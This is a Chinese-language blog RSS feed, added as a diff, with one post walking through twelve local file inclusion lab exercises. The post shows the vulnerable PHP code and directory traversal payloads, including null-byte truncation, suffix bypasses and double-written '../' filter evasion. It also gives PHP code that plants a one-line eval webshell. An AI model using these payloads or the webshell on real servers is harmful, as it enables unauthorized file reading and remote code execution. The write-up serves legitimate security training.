@@ -1,0 +1,148 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>My Violet Eva Garden • Posts by &#34;文件包含探究&#34; category</title>
+        <link>https://kiyomijin.github.io</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Thu, 20 Oct 2022 23:49:56 +0800</pubDate>
+        <lastBuildDate>Thu, 20 Oct 2022 23:49:56 +0800</lastBuildDate>
+        <category>原创</category>
+        <category>SQL注入探究</category>
+        <category>G计划</category>
+        <category>数据库安全</category>
+        <category>XSS跨站脚本攻击探究</category>
+        <category>文件上传漏洞探究</category>
+        <category>文件包含探究</category>
+        <category>CTF小训</category>
+        <category>Misc</category>
+        <item>
+            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/</guid>
+            <title>文件包含进阶（一）</title>
+            <link>https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/</link>
+            <category>文件包含探究</category>
+            <pubDate>Thu, 20 Oct 2022 23:49:56 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;文件包含漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件包含漏洞&#34;&gt;#&lt;/a&gt; 文件包含漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;lfi-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-1&#34;&gt;#&lt;/a&gt; LFI-1&lt;/h2&gt;
+&lt;p&gt;查看后台源码&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;     &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;../common/header.php&amp;quot;&lt;/span&gt;);   &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; https:&lt;span class=&#34;comment&#34;&gt;//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;hint&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;will include the arg specified in the GET parameter \&amp;quot;page\&amp;quot;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form action=&lt;span class=&#34;string&#34;&gt;&amp;quot;/LFI-1/index.php&amp;quot;&lt;/span&gt; method=&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input type=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; name=&lt;span class=&#34;string&#34;&gt;&amp;quot;page&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;page&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;请求 form 表单， &lt;code&gt;GET&lt;/code&gt;  方式，请求 &lt;code&gt;index.php&lt;/code&gt;  时，会调用 php 的 &lt;code&gt;include($_GET[&amp;quot;page&amp;quot;].&amp;quot;.html&amp;quot;);&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//www.lfi.com/LFI-1/?page=../phpinfo.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221019234908422.png&#34; alt=&#34;image-20221019234908422&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-2&#34;&gt;#&lt;/a&gt; LFI-2&lt;/h2&gt;
+&lt;p&gt;参数是 &lt;code&gt;library&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;由于 Hint 是 %00 截断，那么我们尝试：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-2/?library=../../../boot.ini%00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020000125556.png&#34; alt=&#34;image-20221020000125556&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-2/?library=../../../phpinfo.php%00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020000057865.png&#34; alt=&#34;image-20221020000057865&#34;&gt;&lt;/p&gt;
+&lt;p&gt;那么我们可以任意文件包含，去包含 webshell.php&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-2/?library=../../../webshell.php%00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用菜刀连接：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020000532196.png&#34; alt=&#34;image-20221020000532196&#34;&gt;&lt;/p&gt;
+&lt;p&gt;从这题可以看到，文件包含本质是利用文件包含 &lt;code&gt;include&lt;/code&gt; 、 &lt;code&gt;require&lt;/code&gt;  等漏洞来进行&lt;strong&gt;文件上传&lt;/strong&gt;或&lt;strong&gt;文件访问&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-3&#34;&gt;#&lt;/a&gt; LFI-3&lt;/h2&gt;
+&lt;p&gt;查看 Hint&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020000927815.png&#34; alt=&#34;image-20221020000927815&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看后台源码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;], -&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;string&#34;&gt;&amp;#x27;.php&amp;#x27;&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;//从结尾倒数第四个开始，取4个长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are not allowed to see source files!&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;代码核心逻辑讲了：&lt;/p&gt;
+&lt;p&gt;从 &lt;code&gt;GET&lt;/code&gt;  获取到的 &lt;code&gt;file&lt;/code&gt;  参数内容里截取倒数第 4 个开始，取 4 个长度的子字符串&lt;/p&gt;
+&lt;p&gt;将此字符串和 &lt;code&gt;.php&lt;/code&gt;  (4 个字符) 进行比较 ——&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果相等则显示 “You are not allowed to see source files!”&lt;/li&gt;
+&lt;li&gt;否则调用 &lt;code&gt;file_get_contents&lt;/code&gt;  显示文件内容，或者如果是 &lt;code&gt;php&lt;/code&gt;  的话前台浏览器会解析 &lt;code&gt;php&lt;/code&gt;  代码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;那么，利用点就是 &lt;code&gt;过掉这个if条件判断&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;首先，我们先确定相对路径：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-3/index.php?file=../../../../boot.ini&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020001601472.png&#34; alt=&#34;image-20221020001601472&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后将 &lt;code&gt;boot.ini&lt;/code&gt;  替换成 &lt;code&gt;phpinfo.php&lt;/code&gt; ，注意加 &lt;code&gt;/.&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php/.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;查看页面源代码，成功解析 php 代码：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020002018746.png&#34; alt=&#34;image-20221020002018746&#34;&gt;&lt;/p&gt;
+&lt;p&gt;理论上，可以用任何多余特殊字符绕过：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-3/index.php?file=../../../../phpinfo.php+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;均成功解析 php&lt;/p&gt;
+&lt;h2 id=&#34;lfi-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-4&#34;&gt;#&lt;/a&gt; LFI-4&lt;/h2&gt;
+&lt;p&gt;直接查看源码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$path&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;includes/class_&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;addslashes&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;]).&lt;span class=&#34;string&#34;&gt;&amp;#x27;.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;核心逻辑&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;拼接 &lt;code&gt;includes/class_&lt;/code&gt;  + &lt;code&gt;经过addslashes处理的GET请求参数class&lt;/code&gt;  +  &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后使用 &lt;code&gt;file_get_contents&lt;/code&gt;  函数回显这个拼接路径文件&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;： &lt;code&gt;addslashes&lt;/code&gt;  可以对 &lt;code&gt;双引号&lt;/code&gt; 、 &lt;code&gt;单引号&lt;/code&gt; 、 &lt;code&gt;反斜杠&lt;/code&gt; 、 &lt;code&gt;NULL&lt;/code&gt;  前面加一个 &lt;code&gt;反斜杠&lt;/code&gt; 进行转义&lt;/p&gt;
+&lt;p&gt;那么由于后面已经有 &lt;code&gt;.php&lt;/code&gt; ，所以我们只需要构造 &lt;code&gt;phpinfo&lt;/code&gt; ，并尝试相对路径：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-4/?class=../../../../../phpinfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;成功解析到 &lt;code&gt;php&lt;/code&gt;  代码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020003703322.png&#34; alt=&#34;image-20221020003703322&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-5&#34;&gt;#&lt;/a&gt; LFI-5&lt;/h2&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;../&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;pages/&lt;span class=&#34;subst&#34;&gt;$file&lt;/span&gt;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;可以看到，此题将 &lt;code&gt;../&lt;/code&gt;  过滤成 &lt;code&gt;空&lt;/code&gt; ，一般过滤成空的，我们可以通过双写来绕过。&lt;/p&gt;
+&lt;p&gt;那么有&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-5/?file=..././..././..././phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;成功显示 &lt;code&gt;phpinfo&lt;/code&gt;  界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020004759481.png&#34; alt=&#34;image-20221020004759481&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-6&#34;&gt;#&lt;/a&gt; LFI-6&lt;/h2&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;page&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;核心逻辑：&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;POST&lt;/code&gt;  来传递参数，和 &lt;code&gt;LFI-1&lt;/code&gt;  差不多。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020005136900.png&#34; alt=&#34;image-20221020005136900&#34;&gt;&lt;/p&gt;
+&lt;p&gt;那么可以构造：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;page=../../phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020005213444.png&#34; alt=&#34;image-20221020005213444&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如何在服务器上写入一句话木马文件呢？&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;fputs&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;fopen&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;myshell.php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php @eval($_POST[JACK]);?&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020010044983.png&#34; alt=&#34;image-20221020010044983&#34;&gt;&lt;/p&gt;
+&lt;p&gt;后续使用菜刀连接即可。&lt;/p&gt;
+&lt;h2 id=&#34;lfi-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-7&#34;&gt;#&lt;/a&gt; LFI-7&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;library=../../../boot.ini%00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020010438974.png&#34; alt=&#34;image-20221020010438974&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;library=../../../phpinfo.php%00&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020010511820.png&#34; alt=&#34;image-20221020010511820&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-8&#34;&gt;#&lt;/a&gt; LFI-8&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file=../../../../phpinfo.php/.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020010823561.png&#34; alt=&#34;image-20221020010823561&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-9&#34;&gt;#&lt;/a&gt; LFI-9&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class=../../../../../phpinfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020010958041.png&#34; alt=&#34;image-20221020010958041&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-10&#34;&gt;#&lt;/a&gt; LFI-10&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file=..././..././..././phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020011102011.png&#34; alt=&#34;image-20221020011102011&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-11&#34;&gt;#&lt;/a&gt; LFI-11&lt;/h2&gt;
+&lt;p&gt;这题使用了隐藏字段进行传递参数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020011255262.png&#34; alt=&#34;image-20221020011255262&#34;&gt;&lt;/p&gt;
+&lt;p&gt;那么可以有：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;stylepath=../../../../phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020011208724.png&#34; alt=&#34;image-20221020011208724&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;lfi-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-12&#34;&gt;#&lt;/a&gt; LFI-12&lt;/h2&gt;
+&lt;p&gt;还是使用隐藏字段传递，只不过变成了 &lt;code&gt;GET&lt;/code&gt;  型&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/LFI-12/?stylepath=../../../../phpinfo.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
